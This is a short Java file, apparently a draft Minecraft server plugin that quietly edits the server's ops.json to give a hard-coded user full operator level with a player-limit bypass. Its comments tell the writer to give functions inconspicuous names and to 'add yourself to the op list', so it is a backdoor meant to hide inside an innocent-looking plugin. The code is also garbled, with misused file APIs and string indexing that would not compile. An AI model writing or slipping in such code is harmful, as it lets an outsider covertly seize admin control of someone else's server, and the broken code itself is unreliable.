import java.io.*;

class main {
    public static void main(String[] args) throws IOException {

        // Name functions something very inconspicuous
        startPluggedIn();

        /*

        Keep in mind the file structure of the server.
        If you are writing a plugin there is going to be
        an obvious file structure, given that you can run these
        using reletive paths from where the plugin is located.

         */

        FileInputStream in = new FileInputStream("generated");
        FileOutputStream out = new FileOutputStream("../../../src/ops.json");
    }

    private static void startPluggedIn() {
        FileInputStream in = new FileInputStream("../../../src/ops.json");
        FileOutputStream out = new FileOutputStream("generated");

        // Java 8 is ubershit need to come back here and generate the ops string
        String ops = File.readString(in);

        // modify this to add yourself to the op list
        String modops = ops[-1] + ", { \"uuid\": \"2f563a91-9ea0-445f-a1af-14ac67d88538\", \"name\": \"eeayor\", \"level\": 4, \"bypassesPlayerLimit\": true }; ]";
        File.writeString(in, modops);

        in.close();
        out.close();
    }
}